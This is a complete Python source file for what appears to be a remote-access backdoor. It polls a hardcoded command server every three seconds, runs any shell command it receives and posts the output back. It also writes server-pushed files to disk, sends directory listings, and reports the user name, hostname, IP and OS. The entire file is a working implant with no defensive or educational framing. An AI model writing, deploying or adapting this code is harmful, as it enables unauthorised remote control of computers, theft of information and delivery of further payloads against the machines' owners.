import http.client
import json
import socket
import platform
import os
import subprocess
import time
import getpass

SERVER_HOST = "10.0.0.161"
SERVER_PORT = 5001

def get_system_info():
    return {
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "ip": get_ip(),
        "platform": platform.system(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "uptime_sec": get_uptime()
    }

def get_uptime():
    try:
        if os.name == 'posix':
            if platform.system() == 'Darwin':
                output = subprocess.check_output("sysctl -n kern.boottime", shell=True, text=True)
                boot_time = int(output.split('sec =')[1].split(',')[0].strip())
                return int(time.time() - boot_time)
            else:
                with open('/proc/uptime', 'r') as f:
                    return int(float(f.readline().split()[0]))
        else:
            return "Unknown"
    except:
        return "Unknown"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())
    
def check_heartbeat_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_ping")
        response = conn.getresponse()
        if response.status == 200 and response.read().decode().strip() == "yes":
            conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
            conn.request("POST", "/heartbeat")
            conn.getresponse()
    except:
        pass

def post_info():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps(get_system_info())
        conn.request("POST", "/post_info", body=payload, headers=headers)
        conn.getresponse()
    except Exception as e:
        print(f"[!] Error sending system info: {e}")

def check_info_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_post_info")
        response = conn.getresponse()
        if response.status == 200:
            result = response.read().decode().strip()
            if result == "yes":
                post_info()
    except Exception as e:
        print(f"[!] Error checking for system info request: {e}")

def check_file_download():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/get_file")
        response = conn.getresponse()
        if response.status == 200:
            data = json.loads(response.read().decode())
            filename = data.get("filename")
            content = data.get("content")
            if filename and content:
                with open(filename, "wb") as f:
                    f.write(content.encode("latin1"))  # binary-safe
                print(f"[+] Received file: {filename}")

                # Acknowledge to server
                conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
                conn.request("POST", "/ack_file")
                conn.getresponse()
    except Exception as e:
        print(f"[!] Error downloading file: {e}")

def get_command():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/get_command")
        response = conn.getresponse()
        if response.status == 200:
            return response.read().decode().strip()
    except Exception as e:
        print(f"[!] Error getting command: {SERVER_HOST}:{e}")
    return None

def send_result(result):
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps({"result": result})
        conn.request("POST", "/post_result", body=payload, headers=headers)
        conn.getresponse()
    except Exception as e:
        print(f"[!] Error sending result: {e}")

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output

def check_browse_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_browse")
        response = conn.getresponse()
        if response.status == 200:
            data = json.loads(response.read().decode())
            path = data.get("path")
            if path:
                listing = []
                for name in os.listdir(path):
                    full_path = os.path.join(path, name)
                    info = {
                        "name": name,
                        "type": "dir" if os.path.isdir(full_path) else "file",
                        "size": os.path.getsize(full_path) if os.path.isfile(full_path) else "-"
                    }
                    listing.append(info)
                # Send to server
                conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
                headers = {"Content-type": "application/json"}
                payload = json.dumps({"listing": listing})
                conn.request("POST", "/post_listing", body=payload, headers=headers)
                conn.getresponse()
    except Exception as e:
        print(f"[!] Error checking directory listing: {e}")


def main():
    while True:
        check_info_request()
        check_file_download()
        check_heartbeat_request()
        check_browse_request()
        cmd = get_command()
        if cmd and cmd.lower() != "none":
            print(f"[+] Received command: {cmd}")
            output = run_command(cmd)
            send_result(output)
        time.sleep(3)

if __name__ == "__main__":
    main()
